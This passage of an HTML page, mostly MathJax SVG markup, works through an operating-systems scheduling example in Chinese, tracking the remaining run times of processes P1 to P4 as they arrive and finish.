339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1149.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1538.3,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2416.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>表示当前<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.6ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 1149.3 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>进程剩余时间为m。各个时刻的情况如下：</p><p>0时刻(P1到达)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.332ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2356.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1467.6,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><g data-mml-node="mo" transform="translate(1967.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>2时刻(P2到达)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="11.669ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 5157.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1467.6,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(1967.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2356.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2801.2,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(3879.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(4268.8,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(4768.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>4时刻(P3到达)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="18.007ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7959 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1467.6,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(1967.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2356.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2801.2,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(3879.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(4268.8,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(4768.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5157.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5602.4,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(6681,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(7070,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(7570,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>5时刻(P3完成且P4到达)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="18.007ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7959 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1467.6,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(1967.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2356.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2801.2,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(3879.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(4268.8,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(4768.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5157.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5602.4,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 